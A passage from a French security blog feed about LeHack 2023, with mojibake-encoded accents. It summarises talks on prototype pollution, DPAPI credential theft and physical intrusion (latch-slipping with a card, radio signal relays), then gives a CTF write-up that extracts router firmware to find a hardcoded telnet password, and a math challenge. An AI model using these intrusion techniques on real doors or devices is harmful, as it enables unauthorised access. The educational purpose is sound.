&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite8.png&quot; alt=&quot;image&quot; title=&quot;Image sur le serveur&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quelques jours plus tard, nous pouvons rÃ©cupÃ©rer notre document en remplissant la valeur du cookie de la session dans notre navigateur.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/lehack23/Parasite9.png&quot; alt=&quot;recuperation&quot; title=&quot;Image rÃ©cupÃ©ration&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pour Ã©viter le parasitage de votre serveur, nous vous invitons Ã  :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ContrÃ´ler le format et la longueur de tout texte renseignÃ© par un utilisateur;&lt;/li&gt;
  &lt;li&gt;Initialiser un cookie de session aprÃ¨s lâ€™authentification rÃ©ussie de lâ€™utilisateur;&lt;/li&gt;
  &lt;li&gt;Supprimer cÃ´tÃ© serveur le cookie lors de la dÃ©connexion de lâ€™utilisateur;&lt;/li&gt;
  &lt;li&gt;Utiliser un antivirus sur votre serveur pour supprimer les fichiers malveillants.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;confÃ©rence-prototype-pollution-and-where-to-find-them-par-bitk-et-sakiir&quot;&gt;ConfÃ©rence â€œPrototype pollution and where to find themâ€ par &lt;a href=&quot;https://twitter.com/bitk_&quot;&gt;Bitk&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/sakiirsecurity&quot;&gt;Sakiir&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;La pollution des prototypes est une vulnÃ©rabilitÃ© dans les applications JavaScript qui peut avoir des impacts variables en fonction de la complexitÃ© et de la nature de lâ€™application affectÃ©e. Elle exploite la fonction dâ€™hÃ©ritage de prototype JavaScript, qui permet aux objets dâ€™hÃ©riter de propriÃ©tÃ©s et de mÃ©thodes. En manipulant la chaÃ®ne de prototypes dâ€™un objet, un attaquant peut introduire des propriÃ©tÃ©s malveillantes, conduisant Ã  un comportement inattendu et permettant potentiellement Ã  lâ€™attaquant dâ€™exÃ©cuter du code arbitraire.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/prototype-pollution-and-where-to-find-them/&quot;&gt;https://lehack.org/fr/track/prototype-pollution-and-where-to-find-them/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;La confÃ©rence avait pour but de prÃ©senter un aperÃ§u des prototypes JavaScript et des attaques par pollution de ceux-ci.&lt;/p&gt;

&lt;p&gt;Un outil destinÃ© Ã  dÃ©tecter ce type dâ€™attaque en audit de code ou bien en test dâ€™intrusion en boÃ®te blanche nous a Ã©tÃ© prÃ©sentÃ© afin dâ€™identifier plus facilement ce type de vulnÃ©rabilitÃ© sur de grosses applications basÃ©es sur le langage Javascript. Celui ci est accessible sur le gitlab suivant : &lt;a href=&quot;https://github.com/yeswehack/pp-finder&quot;&gt;https://github.com/yeswehack/pp-finder&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Enfin, plusieurs exemples de dÃ©tection et dâ€™exploitation de prototype pollution dans un context de test dâ€™intrusion en boÃ®te noire nous ont Ã©tÃ© prÃ©sentÃ©s. Des exemples de charges utiles permettant dâ€™exploiter les attaques de prototype pollution sur des frameworks ou librairies JavaScripts connus tels que VueJS ^3.2.47, Fastify ^4.13.0 ou Axios 0.27.2 ont pu nous Ãªtre prÃ©sentÃ©es.&lt;/p&gt;

&lt;p&gt;Les consÃ©quences de lâ€™exploitation dâ€™une telle vulnÃ©rabilitÃ© sont variable en fonction de lâ€™application et des librairies utilisÃ©es pouvant permettre de rÃ©aliser par la suite une attaque SSRF (Server Side Request Forgery), jusquâ€™Ã  lâ€™execution de code Ã  distance sur le serveur.&lt;/p&gt;

&lt;p&gt;Pour conclure, les vulnÃ©rabilitÃ©s de prototype pollution sont souvent difficiles Ã  dÃ©tecter dans une approche de test dâ€™intrusion en boÃ®te noire, et lâ€™exploitation dÃ©pend alors majoritairement des composants utilisÃ©s par lâ€™application ciblÃ©e. Il est aussi important de prÃ©ciser que lâ€™exploitation de cette vulnÃ©rabilitÃ© peut avoir des effets de bord important sur lâ€™application pouvant dans certains cas crÃ©er un dÃ©ni de service en corrompant les propriÃ©tÃ©s de lâ€™application.&lt;/p&gt;

&lt;p&gt;Un article publiÃ© sur YesWeHack, rÃ©sume les diffÃ©rentes maniÃ¨res de dÃ©tÃ©cter et dâ€™exploiter cette vulnÃ©rabilitÃ© : &lt;a href=&quot;https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/&quot;&gt;https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;confÃ©rence-dpapi---dont-put-administration-passwords-in-par-thomas-seigneuret-et-pierre-alexandre-vandewoestyne&quot;&gt;ConfÃ©rence â€œDPAPI - Donâ€™t Put Administration Passwords Inâ€ par &lt;a href=&quot;https://twitter.com/_zblurx&quot;&gt;Thomas SEIGNEURET&lt;/a&gt; et &lt;a href=&quot;https://twitter.com/T00uF&quot;&gt;Pierre-Alexandre VANDEWOESTYNE&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;La DPAPI est une API des OS Windows mise Ã  disposition des dÃ©veloppeurs pour stocker facilement les secrets des utilisateurs, sans quâ€™ils aient Ã  se soucier de la partie crypto. Pour les dÃ©veloppeurs, il suffit dâ€™utiliser les fonctions Protect et Unprotect pour respectivement stocker de maniÃ¨re sÃ©curisÃ©e les donnÃ©es et accÃ©der aux donnÃ©es stockÃ©es. Beaucoup de secrets diffÃ©rents sont stockÃ©s via la DPAPI : â€“ Mots de passe de Tasks Scheduled â€“ Mots de passe dans les navigateurs (Chrome Based et Internet Explorer) â€“ ClÃ© privÃ©e des certificats â€“ Mots de passe de certaines solutions (notamment des solutions dâ€™administrations Ã  distance) â€“ etc. Dâ€™un point de vue offensif, ces secrets sont trÃ¨s intÃ©ressants Ã  rÃ©cupÃ©rer, prÃ© et post compromission de domaine, et permettent souvent de pousser plus loin la compromission dâ€™un SI.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/dpapi-dont-put-administration-passwords-in/&quot;&gt;https://lehack.org/fr/track/dpapi-dont-put-administration-passwords-in/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une confÃ©rence attendue Ã©tait celle de Thomas Seigneuret et Pierre-Alexandre Vandewoestyne sur la DPAPI. Cette API, propre aux systÃ¨mes Windows, permet de faciliter la sauvegarde de secrets.&lt;/p&gt;

&lt;p&gt;Les deux experts expliquent quâ€™elle peut facilement devenir un outil redoutable pour un attaquant. Il suffit de compromettre un poste ou serveur Windows dâ€™une entreprise pour rÃ©cupÃ©rer de nombreux identifiants tels que des mots de passe de navigateurs, de tÃ¢ches planifiÃ©es, de bureau Ã  distance, ou encore des clÃ©s privÃ©es de certificats et de points dâ€™accÃ¨s Wi-Fi.&lt;/p&gt;

&lt;p&gt;Pire, pour quelquâ€™un ayant compromis un contrÃ´leur de domaine Active Directory, il devient possible de rapidement rÃ©cupÃ©rer tous ces identifiants de tous les utilisateurs du domaine. Cela peut rapidement permettre de rebondir sur dâ€™autres pÃ©rimÃ¨tres ou services externes Ã  lâ€™entreprise compromise (Tenant Azure, NAS, backups, â€¦).&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;confÃ©rence-physical-intrusion-for-fun-and-profit-par-anthony-boens&quot;&gt;ConfÃ©rence â€œPhysical Intrusion For Fun And Profitâ€ par Anthony BOENS&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;Lors de missions de type intrusion physique, les auditeurs se retrouvent face Ã  diffÃ©rents blocages physiques. Le but de cette prÃ©sentation a pour objectif de dÃ©montrer que nombreux de ces dispositifs de blocage peuvent Ãªtre contournÃ©s facilement et sans entraÃ®nement. En effet, qui ne sest jamais retrouvÃ© face Ã  un Digicode en mÃ©tal ? Une porte fermÃ©e avec un cylindre de mauvaise qualitÃ© ? Ou encore, un portail tÃ©lÃ©commandÃ© ?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Source : &lt;a href=&quot;https://lehack.org/fr/track/physical-intrusion-for-fun-and-profit/&quot;&gt;https://lehack.org/fr/track/physical-intrusion-for-fun-and-profit/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;La premiÃ¨re journÃ©e de confÃ©rences sâ€™est clÃ´turÃ©e par une prÃ©sentation sur les tests dâ€™intrusion physique et plus particuliÃ¨rement sur des techniques de crochetage, dites de â€œlockpickingâ€.&lt;/p&gt;

&lt;p&gt;Anthony a dÃ©montrÃ© que la plupart des serrures sur le marchÃ© peuvent Ãªtre cassÃ©es en trÃ¨s peu de temps. Certaines demandent du matÃ©riel spÃ©cifique, pour par exemple tester plusieurs dizaines de combinaisons dâ€™un coup et trouver le bon alignement des goupilles en quelques secondes. Mais pour un prix bon marchÃ©, la plupart des portes que nous ouvrons au quotidien peuvent facilement Ãªtre ouvertes Ã  lâ€™insu de leur propriÃ©taire.&lt;/p&gt;

&lt;p&gt;Vous avez peur de laisser des traces en crochetant ? Certaines portes claquÃ©es peuvent Ãªtre ouvertes sans crochetage, simplement Ã  lâ€™aide dâ€™une fine feuille rigide, comme des rÃ©sultats mÃ©dicaux de scanner, ou avec votre carte de crÃ©dit, comme lâ€™explique Anthony. Cette technique consiste Ã  glisser la carte entre la porte et le bÃ¢ti et Ã  remonter jusquâ€™Ã  la serrure en donnant de lÃ©gers coups dans la porte pour insÃ©rer notre carte et libÃ©rer le pÃªne demi-tour pour ouvrir la porte.&lt;/p&gt;

&lt;p&gt;Enfin, les portails et voitures Ã  ouverture Ã  distance nâ€™Ã©chappent pas aux attaques par interception de signal radio. En se positionnant entre lâ€™usager et lâ€™Ã©quipement, un attaquant peut intercepter le signal envoyÃ© par le â€œbipâ€ (tÃ©lÃ©commande). Un simple relai du signal permet dâ€™ouvrir des portes de voitures ou de portails privÃ©s.&lt;/p&gt;

&lt;p&gt;Cette confÃ©rence prouve que les sÃ©curitÃ©s physiques ne sont pas encore au niveau de sÃ©curitÃ© attendu par les professionnels et elle dÃ©montre le besoin de sensibiliser les collaborateurs des entreprises Ã  la prÃ©sence dâ€™intrus dans leurs locaux.&lt;/p&gt;</content><author><name></name></author><category term="Articles" /><summary type="html">Advens Ã  lâ€™Ã©vÃ¨nement LeHack 2023</summary></entry><entry><title type="html">48 Meters underground</title><link href="http://localhost:4000/lehack-2023/48meters_underground.html" rel="alternate" type="text/html" title="48 Meters underground" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/lehack-2023/48meters_underground</id><content type="html" xml:base="http://localhost:4000/lehack-2023/48meters_underground.html">&lt;h1 id=&quot;48-meters-underground&quot;&gt;48 meters underground&lt;/h1&gt;

&lt;p&gt;Nous rÃ©cupÃ©rons un fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firmware.bin&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file firmware.bin 
firmware.bin: Linux kernel ARM boot executable zImage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;big-endian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;GrÃ¢ce Ã  la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, nous pouvons identifier que cette image contient un systÃ¨me de fichiers Squashfs. Nous extrayons alors cette image, toujours avec lâ€™outil &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; firmware.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
0             0x0             Linux kernel ARM boot executable zImage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;big-endian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
14419         0x3853          xz compressed data
14640         0x3930          xz compressed data
538952        0x83948         Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2068482 bytes, 995 inodes, blocksize: 262144 bytes, created: 2022-05-03 12:34:33
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le contenu est accessible dans le rÃ©pertoire crÃ©Ã© &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_firmware.bin.extracted&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;        
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali 16777216  2 juil. 01:06 firmware.bin
drwxr-xr-x 75 kali kali    36864 19 juil. 09:32 _firmware.bin.extracted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En parcourant ce rÃ©pertoire, nous identifions la prÃ©sence dâ€™un sous-rÃ©pertoire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squashsf_root&lt;/code&gt;, qui correspond au systÃ¨me de fichiers :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/

&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali      244  9 mars   2021  00-netstate
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali      338  9 mars   2021  00_preinit.conf
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali      236  9 mars   2021  00-sysctl
...
...
...
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali     5756  9 mars   2021  slhc.ko
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali       17  3 mai    2022  &lt;span class=&quot;nb&quot;&gt;sort
&lt;/span&gt;drwxr-xr-x 16 kali kali     4096 19 juil. 09:32  squashfs-root
drwxr-xr-x  2 kali kali     4096 19 juil. 09:32  squashfs-root-0
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kali kali       16  3 mai    2022  ssh


&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/squashfs-root/
total 56
drwxr-xr-x  2 kali kali 4096  9 mars   2021 bin
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 dev
drwxr-xr-x 18 kali kali 4096 19 juil. 09:32 etc
drwxr-xr-x 11 kali kali 4096  9 mars   2021 lib
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 mnt
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 overlay
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 proc
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 rom
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 root
drwxr-xr-x  2 kali kali 4096  9 mars   2021 sbin
drwxr-xr-x  2 kali kali 4096 20 fÃ©vr.  2017 sys
drwxrwxrwt  2 kali kali 4096 20 fÃ©vr.  2017 tmp
drwxr-xr-x  7 kali kali 4096 20 fÃ©vr.  2017 usr
lrwxrwxrwx  1 kali kali    9 19 juil. 09:32 var -&amp;gt; /dev/null
drwxr-xr-x  4 kali kali 4096 20 fÃ©vr.  2017 www
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nous parcourons les diffÃ©rents fichiers/rÃ©pertoires Ã  la recherche dâ€™informations sensibles. Le dossier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts&lt;/code&gt;, qui contient un script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd.sh&lt;/code&gt;, attire notre attention :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/squashfs-root/etc/           
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  441  9 mars   2021 banner
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  408  9 mars   2021 banner.failsafe
drwxr-xr-x 2 kali kali 4096 20 fÃ©vr.  2017 board.d
drwxr-xr-x 2 kali kali 4096  3 mai    2022 config
drwxr-xr-x 2 kali kali 4096 20 fÃ©vr.  2017 crontabs
...
...
...
lrwxrwxrwx 1 kali kali    9 19 juil. 09:32 resolv.conf -&amp;gt; /dev/null
drwxr-xr-x 2 kali kali 4096 11 mars   2021 scripts
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali 3017  9 mars   2021 services
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 kali kali  140 11 mars   2021 shadow
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali    9  9 mars   2021 shells
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  896  9 mars   2021 sysctl.conf
drwxr-xr-x 2 kali kali 4096 20 fÃ©vr.  2017 sysctl.d
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali  128  9 mars   2021 sysupgrade.conf
lrwxrwxrwx 1 kali kali    9 19 juil. 09:32 TZ -&amp;gt; /dev/null
drwxr-xr-x 2 kali kali 4096 20 fÃ©vr.  2017 uci-defaults


&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; _firmware.bin.extracted/squashfs-root/etc/scripts 
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 kali kali 318 11 mars   2021 telnetd.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;En analysant le script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd.sh&lt;/code&gt;, nous identifions que des identifiants de connexion sont prÃ©sents via le paramÃ¨tre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt; de la commande &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd&lt;/code&gt;, sous la forme &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username:password&lt;/code&gt;. Ici, les informations identifiÃ©es sont les suivantes :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Nom dâ€™utilisateur : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Device_Admin&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Mot de passe : contenu du fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/config/sign&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;_firmware.bin.extracted/squashfs-root/etc/scripts/telnetd.sh        
&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/config/sign&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;TELNETD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;rgdb
&lt;span class=&quot;nv&quot;&gt;TELNETD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;rgdb &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; /sys/telnetd&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TELNETD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Start telnetd ...&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/console
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/sbin/login&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
                &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;rgbd &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; /runtime/layout/lanif&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
                telnetd &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/usr/sbin/login&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Device_Admin:&lt;span class=&quot;nv&quot;&gt;$sign&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$lf&lt;/span&gt; &amp;amp;
        &lt;span class=&quot;k&quot;&gt;else
                &lt;/span&gt;telnetd &amp;amp;
        &lt;span class=&quot;k&quot;&gt;fi
fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La lecture du fichier &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc/config/sign&lt;/code&gt; nous permet alors dâ€™obtenir le mot de passse du compte &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Device_Admin&lt;/code&gt;, et le flag du challenge :&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;_firmware.bin.extracted/squashfs-root/etc/config/sign 
w4ll_h1dd3n_p13c3_&amp;lt;&lt;span class=&quot;nt&quot;&gt;-_-&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="Lehack-2023" /><summary type="html">48 meters underground</summary></entry><entry><title type="html">Triangle Wars</title><link href="http://localhost:4000/lehack-2023/trianglewars.html" rel="alternate" type="text/html" title="Triangle Wars" /><published>2023-06-30T00:00:00+02:00</published><updated>2023-06-30T00:00:00+02:00</updated><id>http://localhost:4000/lehack-2023/trianglewars</id><content type="html" xml:base="http://localhost:4000/lehack-2023/trianglewars.html">&lt;h1 id=&quot;triangle-wars&quot;&gt;Triangle Wars&lt;/h1&gt;

&lt;p&gt;Lâ€™Ã©noncÃ© du problÃ¨me demande le pÃ©rimÃ¨tre, infÃ©rieur Ã  1 000 000, qui prÃ©sente le plus grand nombre de formations de triangles de Pythagore.&lt;/p&gt;

&lt;p&gt;Un triangle de Pythagore est un triangle rectangle dont les longueurs des trois cÃ´tÃ©s (a, b, c) satisfont au thÃ©orÃ¨me de Pythagore (aÂ² + bÂ² = cÂ²). Notre tÃ¢che consiste Ã  Ã©numÃ©rer efficacement les triangles possibles et Ã  rechercher les pÃ©rimÃ¨tres qui produisent le plus grand nombre de triangles de Pythagore uniques.&lt;/p&gt;

&lt;p&gt;Pour une approche optimisÃ©e, nous utilisons la formule dâ€™Euclide pour gÃ©nÃ©rer des triangles de Pythagore primitifs. La formule stipule que pour chaque paire dâ€™entiers coprimes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; oÃ¹ :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m &amp;gt; n &amp;gt; 0&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a = mÂ² - nÂ²&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b = 2mn&lt;/code&gt;, et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c = mÂ² + nÂ²&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aÂ² + bÂ² = cÂ²&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m&lt;/code&gt; et &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; ne doivent pas Ãªtre impairs tous les deux&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perimeter = a + b + c&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;/// Algorithme Euclidien pour trouver le PGCD&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gcd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
